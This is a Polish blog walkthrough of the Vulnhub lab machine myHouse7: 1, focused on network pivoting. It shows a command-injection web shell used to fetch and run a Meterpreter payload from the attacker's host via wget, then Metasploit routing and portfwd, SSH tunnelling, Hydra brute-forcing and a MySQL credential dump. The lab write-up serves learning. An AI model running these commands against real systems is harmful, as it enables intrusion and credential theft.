---
title: "myHouse7: 1 - Pivoting"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Vulnhub
  - Walkthrough  
  - Pivoting
header:
  overlay_image: /assets/images/pasek-hack.png
gallery1:
  - url: /assets/images/hacking/2021/09/01.png
    image_path: /assets/images/hacking/2021/09/01.png
gallery2_3:
  - url: /assets/images/hacking/2021/09/02.png
    image_path: /assets/images/hacking/2021/09/02.png
  - url: /assets/images/hacking/2021/09/03.png
    image_path: /assets/images/hacking/2021/09/03.png
gallery4_5:    
  - url: /assets/images/hacking/2021/09/04.png
    image_path: /assets/images/hacking/2021/09/04.png
  - url: /assets/images/hacking/2021/09/05.png
    image_path: /assets/images/hacking/2021/09/05.png
---
# myHouse7: 1
Write-up is in Polish language.

|:----|:----|
|Nazwa:|myHouse7: 1|
|Autor:|[Thepcn3rd](https://www.vulnhub.com/author/thepcn3rd,608/)|
|Wypuszczony:|02.11.2018|
|Do ściągnięcia:|[Stąd](https://www.vulnhub.com/entry/myhouse7-1,286/) - Vulnhub|
|Poziom:|Łatwy|
|Nauczysz się:|Pivoting|

# Wstęp
Ostatnio szukałem czegoś, gdzie mógłbym zastosować Pivoting (dostać się na serwer, który jest za serwerem atakowanym). Na serwisie z podatnymi maszynami [Vulnhub](https://www.vulnhub.com/) znalazłem coś takiego: [myHouse7: 1](https://www.vulnhub.com/entry/myhouse7-1,286/). Niestety ta maszyna może się uruchomić z błędami, ale do tego są odpowiednie [solucje](https://pwnstorm.tech/myhouse-7-1-capture-the-flag-walkthrough/) jak temu zaradzić. Na XCP-NG jeszcze bardziej jest sprawa skomplikowana (niekompatybilny interfejs). Jak zmienić interfejs, żeby dobrze działał na XCP-NG pisałem już [tutaj](https://kerszl.github.io/hacking/xcp-ng-i-vulnhub/). Jeszcze jedna rada z mojej strony odnośnie **myHouse7**. Kiedy obraz zainstalujecie, to nie odpalajcie go do końca, ale od razu wejdźcie w tryb "awaryjny". Zmieńcie interfejs na eth0 i gdzieś zgrajcie pliki z **/home/bob/setup**. Jak to się źle odpali, to się pokasują pliki do instalacji i trzeba będzie od początku wirtualkę zainstalować. Z tego co pamiętam, to plik **"autostart"** jest w **/etc/rc.local**. A skrypt instalacyjny obrazów **Dockera** jest w **/home/bob/setup/buildDockerNet.sh**. Z moich notatek wynika, że jeżeli coś źle pójdzie, to trzeba skasować **/home/bob/setup/config** i potem uruchomić **./home/bob/setup/buildDockerNet.sh**. Na początku chyba trzeba przerobić sieciówkę na **ETH0** i dopiero potem, jak wszystko jest ok, uruchomić **./home/bob/setup/buildDockerNet.sh**. Niestety nie pamiętam dokładnie jak to było, ale zakładam, że wszystko poszło dobrze i wirtualka wystartowała. Jak już wspomniałem o **Dockerze**, to na maszynie jest 7 działających z niego kontenerów.
{: .text-justify}
<div class="notice--primary" markdown="1">
Pod tym adresem http://172.16.1.167:20000/ powinno być mniej więcej coś takiego:
{% include gallery id="gallery1"  %}
</div>
Mamy przy okazji pierwszą flagę, a jest ich 20 lub 19. Autor to dobrze opisał. Flaga ma zapis **{{tryharder:xxx}}**, gdzie **xxxx** jest cyfrą z zakresu **1...9999**. Nie będę opisywał całego przejścia. Częściowa solucja jest [tutaj](https://www.youtube.com/watch?v=hdEjBxhBsVw) i [tutaj](https://www.youtube.com/watch?v=AlZFjc574tM). Motasem Hamdan w drugiej części się skupił na pivotingu, jednak autor trochę poszedł na skróty i użył go przez dostęp do serwera na którym jest odpalony **Docker**. A jeżeli nie mamy takiego dostępu, to co wtedy? Na pomoc przychodzi nam **Metasploit** i jego przekierowanie portów (komenda **portfwd**). Jednak do końca też to dobrze nie działa. Np. nie zawsze udało mi się połączyć przez pivoting **Metasploita** z bazą **Mysql** (o tym później), za to z serwerem **Dockera** na którym jest **SSH** już się to udało bez problemu. Opiszę tutaj pivoting przez **Metasploita** i bez, z dostępem do serwera i przekierowanie portów przez **SSH -L**.
{: .text-justify}
# Zaczynamy
Nie będę opisywał skanowania portów, bo już to pewnie doskonale znacie. Napomknę, że na porcie **8115** jest zainstalowany
[Anchor CMS](https://anchorcms.com/) w wersji [0.12.7](https://github.com/anchorcms/anchor-cms/releases/download/0.12.7/anchor-cms-0.12.7-bundled.zip). Możecie ściągnąć sobie kod i zobaczyć, jak to tam wszystko wygląda. Od strony przeglądarki możemy sobie chodzić po katalogach i np. wejść na **http://172.16.1.167:8115/anchor/**. Wszystkie katalogi są takie jak w źródle. To co przykuło moją uwagę, to wpis w pierwszym poście: **/timeclock/backup/**
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.167:8115/
{% include gallery id="gallery2_3"  %}
</div>
Wchodząc na **http://172.16.1.167:8115/timeclock/backup/** dostajemy piękny dostęp do **Shella**, dzięki komendzie **browse_backups.php**. Odpalając ją mamy listing katalogu, a to już jest wskazówka do wrzucenia tam exploita. Wykonajmy zalecaną komendę. Widzimy, że komenda **ls%20-lha** wyświetliła nam zawartość katalogu:
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.167:8115//timeclock/backup/browse_backups.php?cmd=ls%20-lha
<pre>
<p style="background-color:white;">
total 48K
drwxrwxrwx 1 root root 4.0K Sep  1 07:29 .
drwxr-xr-x 1 root root 4.0K Oct 23  2018 ..
-rw-r--r-- 1 root root  27K Oct 23  2018 all.zip
-rw-r--r-- 1 root root  190 Oct 23  2018 browse_backups.php
-rw-r--r-- 1 root root   18 Oct 23  2018 flag.txt
</p>
</pre>
</div>

# Exploit
Użyjmy **Metasploita** do wrzucenia exploita. :) Wykorzystamy **exploit/multi/script/web_delivery**, a w nim ładunek **linux/x86/meterpreter/reverse_tcp**. Niestety ładunek **PHP** *Meterpretera* nie posiada wszystkich opcji sieciowych. Np. nie ma w nim komendy *arp* i *ifconfig*. Jest za to *portfwd* - komenda do przekierowywania portów, ale czasami może być to za mało.
{: .text-justify}
<div class="notice--primary" markdown="1">
Wpisujemy:
```console
use multi/script/web_delivery
set payload payload/linux/x86/meterpreter/reverse_tcp
set lhost eth0
set target Linux
show options
```
Powinniśmy otrzymać:
```console
[*] Starting persistent handler(s)...
msf6 auxiliary(scanner/discovery/arp_sweep) > use multi/script/web_delivery
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set payload payload/linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set lhost eth0
lhost => eth0
msf6 exploit(multi/script/web_delivery) > set target Linux
target => Linux
msf6 exploit(multi/script/web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen
                                        on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  eth0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   7   Linux
```
</div>
Następnie uruchamiamy exploita w tle:
```console
msf6 exploit(multi/script/web_delivery) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.1.10:4444
msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/L495CA
[*] Local IP: http://172.16.1.10:8080/L495CA
[*] Server started.
[*] Run the following command on the target machine:
wget -qO o6OY7FJX --no-check-certificate http://172.16.1.10:8080/L495CA; chmod +x o6OY7FJX; ./o6OY7FJX& disown
```
Dostajemy link, który trzeba przekonwertować na kod URL. można to zrobić [tutaj](https://www.urldecoder.org/)
{: .text-justify}
<div class="notice--primary" markdown="1">
Tekst surowy:

wget -qO o6OY7FJX --no-check-certificate http://172.16.1.10:8080/L495CA; chmod +x o6OY7FJX; ./o6OY7FJX& disown
{: .notice--info}
</div>
<div class="notice--primary" markdown="1">
Tekst zakodowany do formatu URL:

wget%20-qO%20o6OY7FJX%20--no-check-certificate%20http%3A%2F%2F172.16.1.10%3A8080%2FL495CA%3B%20chmod%20%2Bx%20o6OY7FJX%3B%20.%2Fo6OY7FJX%26%20disown
{: .notice--info}
</div>
<div class="notice--primary" markdown="1">
Całość, czyli link+komenda wklejamy do przeglądarki:

http://172.16.1.167:8115//timeclock/backup/browse_backups.php?cmd=wget%20-qO%20o6OY7FJX%20--no-check-certificate%20http%3A%2F%2F172.16.1.10%3A8080%2FL495CA%3B%20chmod%20%2Bx%20o6OY7FJX%3B%20.%2Fo6OY7FJX%26%20disown
{: .notice--info}
</div>
Jeżeli wszystko poszło dobrze, powinniśmy mieć dostęp do **Shella**.
{: .text-justify}
```console
msf6 exploit(multi/script/web_delivery) >
[*] 172.16.1.167     web_delivery - Delivering Payload (207 bytes)
[*] Sending stage (984904 bytes) to 172.16.1.167
[*] Meterpreter session 1 opened (172.16.1.10:4444 -> 172.16.1.167:60164) at 2021-09-01 16:25:03 +0200

msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                       Connection
  --  ----  ----                   -----------                                                       ----------
  1         meterpreter x86/linux  www-data @ c2422a638c6f (uid=33, gid=33, euid=33, egid=33) @ 172  172.16.1.10:4444 -> 172.16.1.167:60164 (172.16.1.167)
                                   .31.10.17

```
Jeżeli weszliśmy na konsole (session 1) **Meterpretera**, możemy zamknąć przeglądarkę. Kod eksploita już tam siedzi. :smiley: Dzięki komendzie *arp* możemy zobaczyć "skeszowane" arpy.
{: .text-justify}
```
msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > arp

ARP cache
=========

    IP address     MAC address        Interface
    ----------     -----------
        ---------
    172.31.10.1    02:42:1a:3b:48:7d
    172.31.10.25   02:42:ac:1f:0a:19
    172.31.10.194  02:42:ac:1f:0a:c2
    172.31.20.1    02:42:4e:b9:1f:b9
    172.31.20.10   02:42:ac:1f:14:0a
    172.31.20.194  02:42:ac:1f:14:c2

meterpreter > background
[*] Backgrounding session 1...
```
Schowajmy sesje w tło (background) i stwórzmy routing dla sieci 172.31.20.0/24 (1 oznacza nr. sesji):
{: .text-justify}
```console
msf6 exploit(multi/script/web_delivery) > route add 172.31.20.0/24 1
[*] Route added
msf6 exploit(multi/script/web_delivery) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.31.20.0        255.255.255.0      Session 1

[*] There are currently no IPv6 routes defined.
msf6 exploit(multi/script/web_delivery) >
```
Teraz możemy skanować serwery z naszego komputera, które widzi tylko serwer 172.16.1.167:
{: .text-justify}
<div class="notice--primary" markdown="1">
```console
use  auxiliary/scanner/portscan/tcp
set rhosts 172.31.20.194
run -j
```
```console
msf6 auxiliary(scanner/portscan/tcp) > use  auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 172.31.20.194
rhosts => 172.31.200.194
msf6 auxiliary(scanner/portscan/tcp) > run -j
[*] Auxiliary module running as background job 2.
msf6 auxiliary(scanner/portscan/tcp) >
[+] 172.31.20.194:        - 172.31.20.194:24 - TCP OPEN
```
</div>
Jak widzimy, jest otwarty port **24** na ip **172.31.20.194**.
{: .text-justify}
# Pivoting
Teraz możemy przekierować cały ruch z **172.31.20.194**, a dokładniej jeden port na naszą lokalną maszynę:
{: .text-justify}
<div class="notice--primary" markdown="1">
```console
sessions 1
portfwd add -l 24 -p 24 -r 172.31.20.194
portfwd
```
```console
msf6 auxiliary(scanner/portscan/tcp) > sessions 1
[*] Starting interaction with 1...

meterpreter > portfwd add -l 24 -p 24 -r 172.31.20.194
[*] Local TCP relay created: :24 <-> 172.31.20.194:24
meterpreter > portfwd

Active Port Forwards
====================

   Index  Local             Remote      Direction
   -----  -----             ------      ---------
   1      172.31.20.194:24  0.0.0.0:24  Forward

1 total active port forwards.

meterpreter >
```
</div>
Przechodzimy na jakąkolwiek konsolę w naszym systemie i sprawdzamy czy jest otwarty port 24:
{: .text-justify}
```console
root@kali:/home/szikers/myhouse7-1# ss -tuln
Netid          State           Recv-Q          Send-Q                    Local Address:Port                     Peer Address:Port          Process
tcp            LISTEN          0               256                         172.16.1.10:4444                          0.0.0.0:*
tcp            LISTEN          0               256                             0.0.0.0:8080                          0.0.0.0:*
tcp            LISTEN          0               128                             0.0.0.0:22                            0.0.0.0:*
tcp            LISTEN          0               256                             0.0.0.0:24                            0.0.0.0:*
tcp            LISTEN          0               244                           127.0.0.1:5432                          0.0.0.0:*
tcp            LISTEN          0               128                                [::]:22                               [::]:*
tcp            LISTEN          0               244                               [::1]:5432                             [::]:*
```
Widać, że połączanie na 24 porcie jest. Teraz sprawdźmy co się tam kryje:
{: .text-justify}
## SSH
```bash
# root@kali:/home/szikers/myhouse7-1# nmap -sV -p 24 127.0.0.1
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 20:03 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000041s latency).

PORT   STATE SERVICE VERSION
24/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```
**SSH** - łamanie czymkolwiek przez *portfwd* to masakra, nie wiem czym to jest spowodowane, więc od razu wejdźmy na **Shella**.
{: .text-justify}
```console
root@kali:/home/szikers/myhouse7-1# ssh 127.0.0.1 -p 24
FLAG: {{tryharder:308}}
root@127.0.0.1's password:
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-38-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Sep  1 19:16:43 2021 from 172.31.20.1
root@3325411fbe96:~#
root@3325411fbe96:~#
root@3325411fbe96:~# ls
flag.txt
```
Ciekawostka jest taka, że nie zawsze mogłem się dobrze połączyć na **Mysql** (o tym później) przez *portfwd* **Metasploit**a. Za to bez problemu poszło połączenie przez **SSH** na serwer. Jednak tym sposobem trzeba znać login i hasło. Autor wszystkim to ułatwił: **admin**/**admin**. Pokaże jak to działa. Na jednej konsoli nawiązujemy połączenie:
{: .text-justify}
```bash
# ssh -N -L 24:172.31.20.194:24 admin@172.16.1.167
```
a na drugiej łamiemy:
{: .text-justify}
```bash
# root@kali:/home/szikers/myhouse7-1# hydra -P password.txt -L users.txt 127.0.0.1 -s 24 ssh -vv
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-01 22:00:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:6/p:4), ~2 tries per task
[DATA] attacking ssh://127.0.0.1:24/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://admin@127.0.0.1:24
[INFO] Successful, password authentication is supported by ssh://127.0.0.1:24
[ERROR] could not connect to target port 24: Socket error: disconnected
[ERROR] ssh protocol error
[ERROR] could not connect to target port 24: Socket error: disconnected
[ERROR] could not connect to target port 24: Socket error: disconnected
[ERROR] ssh protocol error
[ERROR] ssh protocol error
[ERROR] could not connect to target port 24: Socket error: disconnected
[ERROR] ssh protocol error
[ERROR] could not connect to target port 24: Socket error: disconnected
[ERROR] ssh protocol error
[ERROR] could not connect to target port 24: Socket error: disconnected
[ERROR] ssh protocol error
[ERROR] could not connect to target port 24: Socket error: disconnected
[ERROR] ssh protocol error
[24][ssh] host: 127.0.0.1   login: root   password: anchor
[ERROR] could not connect to target port 24: Socket error: disconnected
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 1
[STATUS] attack finished for 127.0.0.1 (waiting for children to complete tests)
[ERROR] could not connect to target port 24: Socket error: disconnected
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 5
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-01 22:00:39
```
Już trochę lepiej, ale łamanie haseł przez pivoting to jest masakra. Nie wiem czy tak jest wszędzie, bo to moja pierwsza próba, ale podejrzewam, że szybko to nie działa.
{: .text-justify}
## MYSQL
Wracamy do Metasploita. Na ip **172.31.20.10**, porcie **3306** jest **MYSQL**. Też możemy na niego wejść przez *msfconsole* (ile się namęczyłem, zanim mi się udało bez błędu wejść, a okazało się, że to ładunek Metasploita coś miesza, o tym w czerwonej ramce). Login i hasło na **MYSQL**a było w archiwum **http://172.16.1.167:8115/timeclock/backup/all.zip** w pliku **db.php**. Tę operację najlepiej zrobić na świeżo odpalonym **Metasploicie**. Parę razy mi się nie udało, bo w tle musiały być jakieś pozostałości i był błąd podczas łączenia się do bazy. Port **3306** zamieniłem na **3307**, bo ktoś może używać. Jeżeli zaś **3307** jest otwarty, to należy go zamienić na inny. Więc wychodzimy z **Metasploita** i ponownie wchodzimy. Poniżej jest cała procedura:
{: .text-justify}
<div class="notice--primary" markdown="1">
```console
use multi/script/web_delivery
set payload linux/x86/meterpreter/reverse_tcp
set target Linux
run -j
wget -qO jp4AKytE --no-check-certificate http://172.16.1.10:8080/IkIOzVOlj; chmod +x jp4AKytE; ./jp4AKytE& disown
sessions 1
portfwd add -l 3307 -p 3306 -r 172.31.20.10
```
```console
msf6 exploit(multi/script/web_delivery) > exit
[*] Server stopped.
root@kali:/home/szikers# msfconsole
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
[!] The following modules could not be loaded!../
[!]     /usr/share/metasploit-framework/modules/auxiliary/scanner/msmail/exchange_enum.go
[!]     /usr/share/metasploit-framework/modules/auxiliary/scanner/msmail/onprem_enum.go
[!]     /usr/share/metasploit-framework/modules/auxiliary/scanner/msmail/host_id.go
[!] Please see /root/.msf4/logs/framework.log for details.

Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
             
    ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v6.1.2-dev                           ]
+ -- --=[ 2159 exploits - 1144 auxiliary - 367 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: You can upgrade a shell to a Meterpreter
session on many platforms using sessions -u
<session_id>

msf6 exploit(multi/script/web_delivery) > use multi/script/web_delivery
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set target Linux
target => Linux
msf6 exploit(multi/script/web_delivery) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.1.10:4444
msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/IkIOzVOlj
[*] Local IP: http://172.16.1.10:8080/IkIOzVOlj
[*] Server started.
[*] Run the following command on the target machine:
wget -qO jp4AKytE --no-check-certificate http://172.16.1.10:8080/IkIOzVOlj; chmod +x jp4AKytE; ./jp4AKytE& disown
[*] 172.16.1.167     web_delivery - Delivering Payload (207 bytes)
[*] Sending stage (984904 bytes) to 172.16.1.167
[*] Meterpreter session 1 opened (172.16.1.10:4444 -> 172.16.1.167:57356) at 2021-09-02 17:07:38 +0200

msf6 exploit(multi/script/web_delivery) >
msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > portfwd add -l 3307 -p 3306 -r 172.31.20.10
[*] Local TCP relay created: :3307 <-> 172.31.20.10:3306
meterpreter >
```
</div>
Ważne żeby na poczatku załadować ładunek **payload/linux/x86/shell_reverse_tcp**, a nie np. **payload/linux/x86/shell_reverse_tcp** i potem upgradować **Shell**. Wtedy jest problem i pomaga tylko ponowne uruchomienie Metasploita.
{: .text-justify}
{: .notice--danger}
Jeżeli wszystko poszło dobrze, to powinniśmy się połączyć na konsolę. Poniżej cały zapis. 
{: .text-justify}
```bash
# root@kali:/home/szikers# mysql -uroot -panchordb -h 127.0.0.1 -P 3307
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 179
Server version: 10.3.10-MariaDB-1:10.3.10+maria~bionic-log mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| anchor             |
| flag               |
| information_schema |
| mysql              |
| performance_schema |
| timeclock          |
+--------------------+
6 rows in set (0.003 sec)

MariaDB [(none)]> use timeclock
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [timeclock]> show tables;
+---------------------+
| Tables_in_timeclock |
+---------------------+
| time_data           |
| time_periods        |
| time_types          |
| user_info           |
+---------------------+
4 rows in set (0.003 sec)

MariaDB [timeclock]> select * from user_info;
+---------+---------+-------+---------------+----------+----------+
| user_id | fname   | lname | level         | username | password |
+---------+---------+-------+---------------+----------+----------+
|       1 | Admin   | Admin | Administrator | admin    | admin    |
|       4 | larryjr | tin   | Administrator | larryjr  | larryjr  |
|       5 | heather | yool  | Administrator | heather  | heather  |
|       6 | user1   |       | User          | user1    | user1    |
|       7 | user2   | user2 | User          | user2    | user2    |
+---------+---------+-------+---------------+----------+----------+
5 rows in set (0.003 sec)

MariaDB [timeclock]>
```
Widzimy, że mamy hasła użytkowników do bazy timeclock.
{: .text-justify}
# Słowo na koniec
**Pivoting** to niby łatwa sprawa, ale mogą wyjść dziwne okoliczności, jak np. z ładunkiem **Metasploit**a. Jeżeli spodobał się wpis, to napisz mejla.
{: .text-justify}
